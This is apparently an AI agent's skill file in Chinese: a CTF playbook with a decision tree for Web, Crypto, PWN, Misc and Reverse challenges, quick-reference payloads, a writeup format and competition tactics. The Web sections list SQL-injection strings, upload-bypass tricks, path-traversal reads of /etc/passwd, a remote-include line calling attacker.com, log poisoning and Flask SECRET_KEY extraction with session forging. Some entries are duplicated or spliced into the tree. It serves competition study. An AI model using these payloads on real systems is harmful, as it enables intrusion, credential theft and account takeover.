---
name: ctf-playbook
description: "CTF竞赛知识库与自动化工具集 — Web/Crypto/PWN/Misc/Reverse解题思路、payload速查、自动化脚本。比赛时快速调用，覆盖SQL注入/XSS/文件上传/隐写/密码破解等常见题型。"
tags: [ctf, web, crypto, pwn, misc, reverse, forensics, steganography, sql-injection, xss]
---

# CTF Playbook / CTF竞赛知识库

## 触发条件

用户提到：CTF比赛、CTF练习、夺旗、解题、flag、攻防世界、BUUCTF、CTFHub、HackTheBox。

先加载：
- `redteam-flag-mode` (如果涉及比赛运营：flag跟踪、证据记录)
- `pentest-tool-mastery` (工具细节)
- 本技能提供：解题思路、payload、自动化脚本

## 核心文件

速查文档 (按需读取):
- `references/ctf-cheatsheet.md` — 完整知识库 (Web/Crypto/PWN/Misc/Reverse)
- `references/ctf-quickref.md` — 快速参考卡 (可打印)
- `references/ctf-writeup-format.md` — 用户偏好writeup格式 (4步式)
- `references/web-game-ctf-pattern.md` — Web游戏类CTF解题模式+flag调试
- `references/client-side-game-ctf.md` — 浏览器游戏/交互式Web CTF解题法 + flag被拒排查
- `references/ctf-writeup-template.md` — CTF Writeup标准结构模板
- `references/ctf-writeup-template.md` — Writeup模板 (含御网杯格式要求)
- `references/web-game-ctf.md` — Web游戏类CTF题 (贪吃蛇/Flappy Bird等，三种路径解法)
- `references/php-deserialization.md` — PHP反序列化利用 (unserialize→__destruct链/余额篡改/RCE/LFI)
- `references/misc-corrupted-zip.md` — 损坏压缩包分析 (hex修复/base64解码/CRC暴力)
- `references/misc-png-forensics.md` — PNG隐写分析全流程 (chunk解析/trailer提取/像素分析/XOR解密/工具链)
- `references/yuwangbei-ctf-patterns.md` — 御网杯竞赛模式: 跨题联动/XOR key推导/已解题目记录
- `references/misc-nested-zip-maze.md` — 嵌套压缩包迷宫 (逐层解压+base64/MD5+shell循环)
- `references/misc-disguised-file-xor.md` — 伪装文件+嵌入编码提示+XOR解码 (幻影类题)
- `references/re-pe-xor-sbox.md` — PE二进制 XOR+S-Box 替换加密逆向 (VA提取/逆S-Box解码)
- `references/android-apk-re.md` — Android APK + Native .so 逆向 (JNI方法表/ChaCha20密钥提取)
- `references/pyc-bytecode-re.md` — Python .pyc 字节码逆向 (marshal加载/常量池提取/还原算法)

自动化脚本:
- `scripts/ctf-web-recon.sh` — Web快速侦察
- `scripts/ctf-sqli-test.sh` — SQL注入检测
- `scripts/ctf-crack.sh` — 密码破解 (hash/zip/rar/ssh/ftp/mysql/base64/rot13/caesar)
- `scripts/ctf-misc-analyze.sh` — Misc文件分析
- `references/rsa-hastad-affine-attack.md` — RSA Hastad广播攻击仿射变体 (CRT+Coppersmith+LLL)
- `references/rsa-small-exponent.md` — RSA小指数攻击 (e=3开方/Hastad广播)
- `references/flask-ssti-session-forgery.md` — Flask SSTI→SECRET_KEY提取→session cookie伪造→权限提升链
- `references/path-traversal-filter-bypass.md` — 目录穿越过滤绕过 (str_replace单次替换等)
- `references/ctf-crypto.py` — Crypto解密 (15种模式)

实战参考:
- `references/misc-png-forensics.md` — PNG隐写分析全流程 (chunk/trailer/像素/XOR)
- `references/pwn-exploit-patterns.md` — PWN远程利用模板、栈对齐、环境检查
- `references/pwn-fastbin-uaf.md` — Fastbin UAF堆利用 (悬垂指针/利用链/__malloc_hook)
- `references/ctf-writeup-format.md` — CTF解题报告格式（用户偏好）
- `references/php-deserialization.md` — PHP反序列化利用模板
- `references/ctf-quickref.md` — 快速参考卡

## 解题决策树

```
题目类型?
├─ Web
│   ├─ 源码 → 注释/JS/备份/.git/.env
│   ├─ 参数 → SQLi/XSS/IDOR/SSRF/LFI
│   │   ├─ LFI/目录穿越: str_replace('../','')单次替换→用....//绕过 (详见 references/path-traversal-filter-bypass.md)
│   │   └─ SSTI(Jinja2): {{config.SECRET_KEY}}提取密钥→flask-unsign伪造cookie→提权 (详见 references/flask-ssti-session-forgery.md)
│   ├─ 上传 → 绕过(Content-Type/后缀/头/配置文件)
│   ├─ 认证 → 弱口令/JWT/Session/反序列化(unserialize→__destruct/__wakeup)
│   │   ├─ 详见 references/php-deserialization.md
│   │   └─ Flask Session伪造: flask-unsign + SECRET_KEY (详见 references/flask-ssti-session-forgery.md)
│   ├─ 游戏 → 伪造POST/JS注入/自动脚本 (详见 references/web-game-ctf.md)
│   └─ 运行: scripts/ctf-web-recon.sh URL
│
├─ Crypto
│   ├─ 编码识别 → Base64/32/Hex/URL/Unicode
│   ├─ 古典密码 → Caesar/Vigenère/Rail Fence/Bacon/Morse
│   ├─ 现代密码 → RSA(小e/共模/因数分解/Wiener)/AES/DES/ChaCha20
│   │   ├─ RSA小e(e=3): m^3 < n → 直接开立方根 (详见 references/rsa-small-exponent.md)
│   │   ├─ Hastad广播+仿射: e=3, k≥3次加密, (a_i*m+b_i)^3 mod n_i → CRT合并+Coppersmith LLL (详见 references/rsa-hastad-affine-attack.md)
│   │   ├─ ECDSA nonce重用: r相同→恢复k→恢复私钥 (详见 references/ecdsa-nonce-reuse.md)
│   │   ├─ ChaCha20: 32B key + 12B nonce, 常量 "expand 32-byte k", counter从0或1开始
- `references/chacha20-ctf.md` — 手动实现+密钥提取+counter坑
- `references/ecdsa-nonce-reuse.md` — ECDSA nonce重用攻击 (r相同→k→私钥, 含验证+完整脚本模板)
- `references/aes-ecb-ctf.md` — AES-ECB CTF模式 (密钥搜索/暴力/已知明文/误报排查)
- `references/flask-ssti-session-forgery.md` — Flask SSTI黑名单绕过 + SECRET_KEY提取 + session cookie伪造
- `references/path-traversal-filter-bypass.md` — 目录穿越过滤绕过 (str_replace/regex/编码绕过)
│   │   └─ AES-ECB: 相同明文→相同密文, 无重复块说明明文无重复16B段
│   │       └─ 详见 references/aes-ecb-ctf.md (密钥暴力/已知明文/file误报)
│   ├─ 哈希 → hashcat/john/长度扩展
│   └─ 运行: scripts/ctf-crypto.py <mode> <input>
│
├─ Reverse
│   ├─ 静态 → IDA/Ghidra/strings/objdump
│   ├─ 动态 → gdb+peda/ltrace/strace
│   ├─ .NET → dnSpy/ILSpy
│   ├─ Java → jadx-gui/JD-GUI
│   ├─ PE加密算法 → XOR+S-Box替换 (详见 references/re-pe-xor-sbox.md)
│   │   └─ objdump -s -j .rdata 提取数据 → 逆S-Box解码
│   ├─ Python字节码 → marshal加载pyc → 提取code object常量/co_names/co_varnames
│   │   └─ /usr/bin/python3 -c "import marshal; f=open('x.pyc','rb'); f.read(16); co=marshal.load(f); print(co.co_consts)"
│   ├─ Android APK + Native .so → strings快速侦察 + objdump分析JNI层 + 数据流追踪
│   │   └─ 详见 references/android-apk-re.md (JNI方法表/GOT地址计算/验证逻辑红鲱鱼识别/PKCS7填充)
│   └─ 反调试 → ptrace/时间/信号绕过
│
├─ Misc
│   ├─ 文件分析 → file/strings/binwalk/exiftool
│   ├─ 图片隐写 → PNG: exiftool(trailer!)→zsteg -a→stegoveritas→pngcheck→IDAT解压→像素分析
│   │   ├─ 详见 references/misc-png-forensics.md (chunk解析/trailer提取/像素分析/工具链/密钥推导)
│   │   ├─ 关键: exiftool报"Trailer data after IEND"→隐藏数据在IEND后
│   │   ├─ stegoveritas: 自动trailing data提取+图像变换+通道分离+文件carve
│   │   ├─ trailer加密: 系统性尝试密钥推导(CRC/Adler32/filename/像素值/IHDR)→XOR/AES/RC4/ChaCha20
│   │   ├─ PITFALL: 手动hex转录容易出错(漏字节/奇数字符), 始终用Python程序化提取: trailer.hex()
│   │   ├─ PITFALL: 150+密钥×算法穷举仍失败→立即搜索题目名+CTF+writeup (Bing/Chat01.ai/CSDN)
│   │   ├─ PITFALL: 文件名带编号(image_01)或题目说"每张图"→需多张图片拼接, 检查百度网盘/平台附件
│   │   │   └─ 详见 references/misc-png-forensics.md (御网杯案例: image_01/image_03 trailer不同)
│   │   ├─ PITFALL: trailer hex直接当flag提交被拒→可能需要XOR解密, 检查同比赛其他题目的提示
│   │   │   └─ 御网杯案例: shadow_09提示"FLAG IS HIDDEN IN BASE64 PLUS XOR!" key=0x56
│   │   ├─ PITFALL: 同CTF比赛多题联动→搜索其他题目附件找编码提示/共享密钥
│   │   │   └─ 详见 references/misc-png-forensics.md (御网杯多题联动: XOR key推导)
│   │   └─ JPEG/BMP: steghide (PNG不支持steghide!)
│   ├─ 音频隐写 → 频谱图/SSTV/DTMF/摩尔斯
│   ├─ 流量分析 → Wireshark/tshark (HTTP/FTP/DNS)
│   ├─ 压缩包 → 伪加密/CRC爆破/密码破解 (详见 references/misc-corrupted-zip.md)
│   ├─ 嵌套迷宫 → 逐层解压(shell循环)→base64/hex解码 (详见 references/misc-nested-zip-maze.md)
│   ├─ trailer加密密钥推导: CRC/Adler32/filename/MD5(filename)/像素值/IHDR bytes→XOR/AES/RC4
│   │   └─ 详见 references/misc-png-forensics.md (系统性密钥推导源列表+算法优先级)
│   ├─ 损坏zip → hex分析/修复CRC/提取内容→base64/ROT13/XOR解码
│   ├─ 伪装文件 → file报错但strings有提示→base64解码→单字节XOR暴力 (详见 references/misc-disguised-file-xor.md)
│   └─ 运行: scripts/ctf-misc-analyze.sh FILE
│
├─ PWN
│   ├─ 保护检查 → checksec / readelf -l | grep GNU_STACK
│   ├─ 格式化字符串 → 泄露/写入
│   ├─ 栈溢出 → 检查NX/Canary/PIE决定利用方式
│   │   ├─ NX OFF + 栈地址泄露 → shellcode注入 (详见 references/pwn-exploit-patterns.md)
│   │   │   └─ shellcode + NOP sled + saved_rbp + leaked_addr
│   │   ├─ ret2text: 程序自带后门(backdoor/system("/bin/sh"))→覆盖返回地址跳转
│   │   │   └─ 详见 references/pwn-exploit-patterns.md (含栈对齐ret gadget)
│   │   └─ ret2libc: NX ON无后门→泄露libc地址→计算system/"bin/sh"偏移
│   ├─ 堆利用 → fastbin/tcache/house of *
│   │   ├─ Fastbin UAF (悬垂指针): Delete不置NULL→Edit写已释放内存→覆写fd→__malloc_hook
│   │   │   └─ 详见 references/pwn-fastbin-uaf.md (识别模式/利用链/size check bypass)
│   │   └─ libc-2.23: 无tcache, 无fastbin double-free检测
│   └─ 工具: pwntools/gdb+pwndbg/ROPgadget
│       └─ 注意: /usr/local/bin/python3 可能是ropgadget wrapper, 用 /usr/bin/python3
│           pwntools导入卡住时用纯socket+struct+time替代
│
└─ Reverse
    ├─ 静态 → IDA/Ghidra/strings/objdump
    ├─ 动态 → gdb+peda/ltrace/strace
    ├─ .NET → dnSpy/ILSpy
    ├─ Java → jadx-gui/JD-GUI
    └─ 反调试 → ptrace/时间/信号绕过
```

## Web 快速检查清单

1. Ctrl+U 查看源代码 (注释/隐藏字段/JS)
2. curl -I URL 查看响应头
3. robots.txt / sitemap.xml
4. .git/HEAD (git-dumper下载)
5. .env / .DS_Store / 备份文件 (www.zip/backup.zip)
6. JS文件分析 (API路由/密钥/隐藏功能)
7. 注册/登录功能 (SQL注入/XSS)
8. 上传功能 (文件上传漏洞)
9. 参数FUZZ (ffuf/dirsearch)
10. 子目录扫描 (admin/api/debug/console)

## SQL注入速查

```
检测: ' OR 1=1-- / " OR 1=1-- / ') OR 1=1--
联合: -1 UNION SELECT 1,2,3--
报错: ' AND extractvalue(1,concat(0x7e,(SELECT database())))--
盲注: ' AND SLEEP(5)--
工具: sqlmap -u URL --batch --dbs
绕过: /**/代替空格, 双写关键字, 大小写混合, %0a换行
```

## 文件上传绕过

```
后缀: .php3 .php5 .phtml .phar .jspx .asa .cer
Content-Type: image/jpeg / image/png
文件头: GIF89a / \x89PNG
双重后缀: shell.php.jpg / shell.php%00.jpg
配置文件: .htaccess (AddType) / .user.ini (auto_prepend_file)
竞争条件: 上传→执行→删除(来不及删除)
```

## 文件包含

```
本地: ?page=../../../../etc/passwd
绕过: ....//....//....//etc/passwd (str_replace('../','')单次替换, 详见 references/path-traversal-filter-bypass.md)
PHP: ?page=php://filter/convert.base64-encode/resource=index.php
远程: ?page=http://attacker.com/shell.txt
日志投毒: User-Agent写入PHP代码 → 包含日志文件
```

## Flask SSTI

```
确认: {{7*7}} → 49
提取密钥: {{config.SECRET_KEY}} (不需要__globals__, 绕过大多数黑名单)
伪造session: flask-unsign --sign --cookie "{'user_id':1,'role':'admin'}" --secret 'KEY'
详见 references/flask-ssti-session-forgery.md
```

## Crypto 常见模式

```
凯撒: 暴力枚举25种偏移
维吉尼亚: 频率分析/已知密钥
栅栏: 尝试2-10栏
RSA: 小e直接开方, 共模攻击, factordb.com因数分解
Base64: 检查是否多层编码
XOR: 单字节暴力(0-255)
```

## Misc 隐写检查流程

```
1. file FILE (确认类型)
2. strings FILE (搜索flag/关键词)
3. binwalk FILE (嵌入文件)
4. exiftool FILE (元数据, trailer警告!)
5. PNG: pngcheck FILE (完整性)
6. PNG: zsteg -a FILE (全位平面LSB)
7. PNG: stegoveritas FILE -trailing -carve -imageTransform -out /tmp/sv
8. JPEG: steghide extract -sf FILE -p ""
9. 高度篡改: 修改PNG IHDR高度字节
10. Trailer数据: 系统性密钥推导→XOR/AES/RC4 (详见 references/misc-png-forensics.md)
11. 音频: Audacity频谱图
12. 流量: Wireshark导出HTTP对象
13. 多文件: 题目说"每张图"或文件名带编号→需要所有文件拼接
14. 多题联动: 搜索同比赛其他题目附件→找编码提示/共享XOR密钥 (如shadow_09提示"BASE64 PLUS XOR")
15. 搜索: 题目名+CTF+writeup (Bing/Chat01.ai/CSDN/CN-SEC)
```

## 用户偏好 Writeup 格式

用户要求的writeup结构（4步式，简明直接）：

```
题目名称：xxx
题目类型：WEB/Crypto/Misc/Reverse/PWN
难度：初级/中级/高级
分值：xxx分
靶机地址：xxx

一、解题过程

1. 获取到某某文件 — 描述访问目标、获取源码/文件的过程
2. 然后利用某某工具 — 描述使用的工具和分析过程
3. 再去利用某某编码/技术 — 描述编码/解码/构造payload等技术手段
4. 然后解出flag — 给出最终flag

二、漏洞分析

【1-2段简明的漏洞原理分析和危害说明】
```

关键原则:
- 简洁直接，不要长篇大论
- 每步一句话概括核心动作（"获取到""利用""再去""解出"）
- flag单独一行突出显示
- 漏洞分析要说明根因和危害
- 不用HTML，纯文本
- 代码审计题：强调"源码分析发现"→"构造Payload"→"触发漏洞"
参考: references/ctf-writeup-format.md

## 比赛策略

### 赛前准备 (比赛开始前必做)
1. **读规则**: 确认积分衰减机制（前N名100%/90%/80%...）、flag格式要求、writeup模板下载/上传时间窗口
2. **记录关键时间**: 题目分批发放时间、writeup截止时间、签到要求
3. **确认提交方式**: flag格式（含/不含flag{}）、是否需要writeup、是否有反作弊检测

### 解题优先级
1. **前30分钟**: 浏览所有题目，标记简单题（签到题/分值低但快）
2. **Web优先**: 通常题目最多，得分快
3. **Misc快速**: 文件分析/签到题往往最简单
4. **Crypto别死磕**: 5分钟没思路就跳过
5. **PWN看情况**: 简单栈溢出可以尝试
6. **拿到flag立即提交**: 不要等（积分衰减机制下时间=分数）
7. **搜索技巧**: 题目名 + CVE/writeup
8. **团队分工**: Web/Misc/Crypto/PWN各负责

### 签到题模式 (常见于国内CTF)
签到题通常是最简单的入门题，常见类型：
- 损坏压缩包 → base64/hex/ROT13解码
- 隐藏信息 → 源码注释/图片EXIF/流量分析
- 简单Web → 客户端验证绕过/JS混淆
- 编码识别 → 多层编码嵌套（base64→hex→base64）

## Flag格式注意

常见格式: flag{xxx} / ctf{xxx} / FLAG{xxx} / flag-xxx
提交前检查: 多余空格/换行/大小写

## Flag被拒排查流程

当服务端返回的flag在竞赛平台提交被拒时，按顺序尝试：
1. 原样提交: flag{xxx}
2. 去外层: xxx（仅hash部分）
3. 全大写: FLAG{XXX}
4. 检查多余空格/换行（echo -n去尾部\n）
5. 检查是否有多层编码（base64/hex嵌套）
6. 确认是否同session返回不同flag（刷新session重试）
7. 检查flag内容是否含特殊字符（下划线/连字符易混淆）
若均失败，可能需要换方法获取flag（如必须实际完成游戏操作）

## 浏览器游戏/交互题解题模式

Web CTF中出现"玩游戏得flag"类题目，通用解题流程：

1. 查看页面源码（Ctrl+U / curl），找JS中flag获取逻辑
2. 找到score提交的API端点（通常是fetch/XMLHttpRequest POST）
3. 优先尝试直接curl POST伪造score（无签名校验时直接成功）
4. 若直接POST的flag被拒，改用浏览器console操作：
   a. clearInterval(gameLoop) 停止游戏
   b. 直接修改score变量 + document.getElementById更新显示
   c. 拦截fetch: window.fetch = function(url,opts){ return origFetch(...).then(r => r.clone().text().then(t => {console.log(t); return r})) }
   d. 调用checkWin(score)触发提交，从console看原始响应
5. 若必须实际玩到目标分，注入auto-play bot（setInterval 10ms加速）
6. 检查服务端是否有session/game_token验证（FormData vs JSON vs URL参数）

参考: references/client-side-game-ctf.md

关键: 先路径A，失败则路径B，最后路径C。大多数CTF游戏题是路径A。

### PITFALL: curl session cookie 不生效 (PHPSESSID)

场景: 用 curl `-b cookies.txt -c cookies.txt` 保持session，但服务端返回 "Authentication required"。

原因: curl 的 Netscape cookie 格式在处理带端口的URL时，cookie domain 匹配可能失败。

可靠做法 — 显式传递session ID：
```bash
# 1. 先访问首页，从响应头提取session
SESS=$(curl -sv http://target:port/ 2>&1 | grep -oP 'PHPSESSID=\K[^;]+')

# 2. 后续请求用 -H 显式传cookie（不要用 -b cookie文件）
curl -s -b "PHPSESSID=$SESS" -X POST http://target:port/api/endpoint -d 'param=value'

# 3. 多步操作时保持同一SESS变量
curl -s -b "PHPSESSID=$SESS" -X POST http://target:port/buy.php -d 'item=flag'
```

### PITFALL: 服务端返回flag但平台拒绝

场景: 通过伪造POST请求获取到flag字符串，但竞赛平台显示"答案错误"。

案例(御网杯贪吃蛇题): 服务端始终返回 `flag{5cf1ef3539860b778211db423b4f6558}`，但平台拒绝。
尝试了: 原样/去flag{}/大写/不同session/浏览器console操作 → 全部相同flag，全部被拒。
可能原因: 平台有反作弊检测、flag已过期/更换、或需要特定的游戏完成路径。

原因分析:
- 服务端可能有session/cookie级别的游戏状态校验
- 可能需要通过实际游戏流程触发flag生成（服务端跟踪游戏过程）
- flag可能是动态生成的，每次请求结果不同
- 可能存在隐藏的校验参数（如game_token/timestamp/signature）
- 可能需要特定的Content-Type或请求头

正确做法:
1. 先确认flag格式是否正确（含/不含flag{}前缀）
2. 检查是否有额外的请求头或cookie要求
3. 尝试在浏览器console中操作游戏变量，让游戏自然结束触发checkWin
4. 检查是否有隐藏的表单字段或额外的验证请求
5. 尝试通过浏览器Network面板抓包对比正常提交和伪造提交的差异
6. 如果以上都不行，考虑需要真正玩到目标分数（用JS自动控制）

### PITFALL: Web游戏类CTF题的两种思路

游戏类题目（贪吃蛇、Flappy Bird、2048等）通常有两条路:

路径A — 客户端伪造 (先尝试，快):
  curl -X POST URL -F 'score=300'  # 直接提交目标分数
  如果返回flag且平台接受 → 完成

路径B — JS注入自动玩 (伪造不行时):
  // 浏览器console中:
  score = 300;  // 直接改分数
  // 或者重写游戏逻辑让蛇自动吃食物
  // 然后触发正常的游戏结束流程

路径C — 全自动游戏脚本 (需要真正玩到目标分时):
  用JavaScript编写自动寻路算法（贪吃蛇可用BFS/DFS），
  通过setInterval控制蛇的移动方向，自动吃到足够食物。

关键: 先路径A，失败则路径B，最后路径C。大多数CTF游戏题是路径A。
